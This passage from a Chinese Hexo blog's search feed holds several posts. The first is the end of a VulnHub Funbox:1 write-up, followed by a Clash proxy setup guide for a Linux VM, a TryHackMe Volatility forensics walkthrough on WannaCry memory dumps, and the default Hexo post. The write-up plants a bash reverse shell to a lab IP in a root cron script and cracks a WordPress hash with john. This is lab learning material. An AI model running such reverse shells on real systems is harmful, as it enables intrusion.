src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b7b6b4af3149bae0c0995.png"><br>果然，是发现有一个root的计划任务和funny的计划任务，后面更是发现，root是5分钟执行一次，funny用户是2分钟执行一次</p></blockquote><h2 id="💀-反弹root-shell-reverse-root-shell"><a href="#💀-反弹root-shell-reverse-root-shell" class="headerlink" title="💀 反弹root shell(reverse root shell)"></a>💀 反弹root shell(reverse root shell)</h2>因为我们对backup有修改权限，我们直接在backup脚本中写入反弹shell的语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.61.126/1234 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li><li><code>bash -i</code> 这部分启动Bash shell，并使用-i标志表示要以交互方式运行，这意味着它可以接收用户输入并显示输出</li></ul><ul><li><code>&gt;&amp; /dev/tcp/192.168.61.126/1234</code> 这是一个重定向操作符，将Bash的标准输出和标准错误（1和2）都重定向到指定的IP地址和端口上的网络连接。具体来说，它将输出重定向到/dev/tcp/192.168.61.126/1234。 </li><li><code>0&gt;&amp;1</code> 这也是一个重定向操作符，将标准输入（0）重定向到与标准输出相同的地方，也就是之前重定向到网络连接的位置。</li></ul><p><em>这个命令的作用是将Bash shell的输入和输出连接到IP地址192.168.61.126上的端口1234，这通常用于建立与另一台计算机的反向Shell连接，使远程主机可以控制和执行命令在被攻击的主机上</em><br>这是一个常见的bash反弹shell的语句，然后我们在kali开启nc监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: 这是netcat的一个选项，用于指示netcat进入监听模式，即等待传入连接。</li><li><code>-n</code>: 这是另一个选项，用于指示netcat不要执行DNS解析，以便更快地处理连接。</li><li><code>-v</code>: 这是一个选项，用于启用详细的输出，通常用于调试目的。</li><li><code>-p</code>: 指定netcat监听的端口号。在这个例子中，它监听端口1234。</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/542b7d44ebc8de496e855.png"><br>多次监听后也是成功拿到了root的shell</p></blockquote><h1 id="🐇-兔子洞-rabbit-hole"><a href="#🐇-兔子洞-rabbit-hole" class="headerlink" title="🐇 兔子洞(rabbit hole)"></a>🐇 兔子洞(rabbit hole)</h1><p>一开始我们在wpscan扫描出来的另外一个用户，admin，我们拿到joe的shell后可以去网站目录下看wp的配置文件，然后进入数据库查看用户名和密码</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdabd8ccbe42d5dd99a36.png"></p></blockquote><p>接着我们把这个给复制出来，用john去爆破这个hash值</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4bd2db2cd64b31a2b16c6.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>pass.txt</code> 将要破解的hash值写入一个文本文件</li><li><code>--wordlist=</code> 指定密码字典为kali共享目录下的rockyou字典<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/820ac9f18fdb94c6a0373.png"></p></blockquote></li></ul><p>爆破出来后我们可以看到是<code>iubire</code>，拿去登录看看</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/90b8aaa87687692b46389.png"></p></blockquote><p>成功登录后我们可以试着看能不能用wp的漏洞去getshell，但是很显然在这里应该是拿不到root权限的，最多拿一个普通shell，或者说普通shell都拿不到<br>具体咋样还有待后续的尝试<br><em>待续</em></p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p>国外大佬关于funbox:1的wp:<a href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/#-foothold">funbox:1</a><br>rbash逃逸的方法:<a href="https://xz.aliyun.com/t/7642">rbash逃逸</a><br>funbox:1靶机下载地址:<a href="https://www.vulnhub.com/entry/funbox-1,518/">下载</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux使用clash简便方法</title>
    <link href="/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/"/>
    <url>/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="如何超级简单的使用魔法，在你的虚拟机中？"><a href="#如何超级简单的使用魔法，在你的虚拟机中？" class="headerlink" title="如何超级简单的使用魔法，在你的虚拟机中？"></a>如何超级简单的使用魔法，在你的虚拟机中？</h2><p>平时在虚拟机中总会遇到用魔法的时候，但是有这么几个问题？</p><ul><li>linux 不同于 windows，操作安装都简单（大佬略过），我们在 linux 上安装 v2ray 或者 clash 都会可能时不时遇到报错，又或者配置错误</li><li>可能会有很多太虚拟机，每台虚拟机都配置一下岂不是很烦？</li><li>有的魔法会限制设备数，虚拟机和本机是算一个还是多个（这个我不知道，存疑）</li></ul><p>诸如以上的问题，那要如何方便的使用魔法，只需俩步：</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>在 windows 的 clash 客户端中开启 Allow Lan 选项，如图</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bd6da1cfa43536515211b.png"><br>此时记住我们的端口号</p></blockquote><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>打开我们的虚拟机的设置，按以下步骤设置</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f04002b20e7398c81cd1f.png"></p></blockquote><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2a6c3590350c838c1c0a3.png"></p></blockquote><p>此时我们在终端和浏览器中都可以访问外网了<br>这样我们 git 也快很多，也不必换源了。<br>v2ray 的话没有去试过，因为之前 v2ray 的订阅过期了，但是 v2ray 里有个相同的设置，按道理应该也可以</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/05b311eecc4013f3b4d68.png"></p></blockquote><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ul><li>一般物理机 ip 分配的不会变，但是如果虚拟机不能施展魔法了，请查看物理机 ip 是否改变</li><li>虚拟机和物理机要在同一个局域网中，建议使用虚拟机中的桥接模式，然后在网络设置中选择和物理机同一张网卡</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>我之前是用的 ubuntu23 版本，然后在网上换了个阿里云的源，后面下载 ssh 服务和其他东西的的时候一直报错安装不了</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/21e0106f6e08af927e5f7.png"></p></blockquote><p>当时一直问 gpt，然后没解决，后面百度了” g++ : 依赖: cpp (= 4:9.3.0-1ubuntu2) 但是 4:12.2.0-3ubuntu1 正要被安装”才知道是因为源的问题，然后我又换回原来的源</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>clash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>clash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme房间volatility 取证</title>
    <link href="/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/"/>
    <url>/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="题目-1"><a href="#题目-1" class="headerlink" title="题目 1"></a>题目 1</h1><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d981f70b0a96644b8e338.png"><br>已知信息：由 abode 文档感染而来,还有一个 ip</p><ul><li>第一问和第二问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9d6cec469ce44083152b8.png"><br>就是求主机信息，根据前面的教程，我们用 windows.info 插件就可以</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.info<br></code></pre></td></tr></table></figure><blockquote><p>此处-f 指定镜像内存文件</p></blockquote><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f88bf187bdfe43fc9e5f.png"></p></blockquote><ul><li>第三问 <u><br>What process can be considered suspicious in Case 001?</u><br>哪个是可疑进程，用 windows.pslist 求出进程列表就行，如果没发现，就用 windows.psscan，可以看隐藏的进程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pslist<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8247d4d481636428691fb.png"><br>根据之前给的提示，就是这个 reader_sl.exe 进程，把这个的信息交上去即可</p></blockquote><ul><li>第 456 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f6c9f21cc546bbae1434c.png"><br>就是求父进程信息，可疑进程 pid，父进程 pid，我们用 windows.pstree</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pstree<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1c317d503bcf162f98fb3.png"></p></blockquote><ul><li>第七八问<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0b839dc4d4b38ec6bdd8c.png"><br>求 user-agent 以及一个银行也没有关系，这个时候就要查一个具体的进程内容了<br>这个时候，可以用 windows.memmap.Memmap 插件看内存信息，然后–dump 给保存下来</p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem -o /tmp/ windows.memmap.Memmap --pid 1640 --dump<br></code></pre></td></tr></table></figure><blockquote><p>-o 指定输出路径，–pid 指定进程 pid，–dump 保存进程信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/19fd7393ac32f675d98a3.png"><br>这是正常的输出<br>然后用 strings 命令打印输出</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i user-agent<br></code></pre></td></tr></table></figure><blockquote><p>grep -i 忽略大小写<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/30ca5f8ebcb96c431b47e.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i chase<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/663d31ed91db660eb3c19.png"><br>看到输出了和 chase 有关的网站，那就是有关了</p></blockquote><h1 id="题目-2"><a href="#题目-2" class="headerlink" title="题目 2"></a>题目 2</h1><p>题目内容是中了勒索病毒</p><ul><li>第一问<br>求可疑进程，用 windows.pslist 即可，然后就可以看见大名鼎鼎的@WanaDecryptor@<br>可以看出来和 wannacry 有关，pid 为 740</li></ul><ul><li>第 2345 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f3961a062c95d11f65ebf.png"><br>父进程可以用 windows.pstree 求出来<br>完整路径可以用 windows.dlllist</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist | grep @WanaDecryptor@.exe<br></code></pre></td></tr></table></figure><blockquote><p>此处也可以用–pid 指定进程，然后可以看见第一个出来的就是他的完整路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/904ac9588136018c151ab.png"><br>至于第 5 问，把可疑进程名字放到浏览器一搜就可以看见大名鼎鼎的 Wannacry 病毒</p></blockquote><ul><li>第 6 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/654189c4a023ad21740a0.png"><br>问 decryptor 加载了什么 dll 去创建 socket，之前可以知道 decryptor 就是 taskche.exe，pid 为 1940<br>先用 windows.dlllist 求出所有的 dll</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist --pid 1940 | grep .dll<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8f04e5642bdf1d58bbbf2.png"><br>然后把所有信息复制下来去问 gpt，让他讲解这里面的 dll 都是什么功能<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5792ece2faae0c83e681d.png"></p></blockquote><ul><li>第 7 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7ffdc296bcca2c1db8119.png"><br>哪些互斥体(mutex)可以看出是恶意软件<br>想知道 mutex 是什么可以去问 gpt<br>这个时候我们就需要用到 windows.handles，这个插件可以列出一个进程的所有句柄<br>那么，句柄（handles）又是什么呢？</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ce4809f4968ba0365d65b.png">可以参考这个，学过操作系统的应该都可以明白</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.handles --pid 1940<br></code></pre></td></tr></table></figure><p>现在来看看输出</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1cefe6ad7f8b049e31e29.png"><br>现在不明白的都可以看到了，至于哪个是答案，可以从搜索引擎得到答案，搜索引擎很重要</p></blockquote><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wannacry mutant</span><br></code></pre></td></tr></table></figure><p>这样搜即可</p><ul><li>最后一问，这个我也不会，没搞明白，也是通过看提示 windows.filescan，这就是答案</li></ul><h1 id="推荐文章视频"><a href="#推荐文章视频" class="headerlink" title="推荐文章视频"></a>推荐文章视频</h1><p>大神做这个房间的时候的视频（youtube）：<a href="https://www.youtube.com/watch?v=2DZqg2rcYTk">volatility 视频</a><br>有关 Wannacry 的文章，在这里面可以找到有关哪个 mutant 和 dll 的讲解：<a href="https://www.mandiant.com/resources/blog/wannacry-malware-profile">WannaCry Malware Profile</a></p>]]></content>
    
    
    <categories>
      
      <category>tryhackme</category>
      
      <category>取证</category>
      
      <category>volatility</category>
      
    </categories>
    
    
    <tags>
      
      <tag>volatility</tag>
      
      <tag>tryhackme</tag>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/hello-world/"/>
    <url>/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
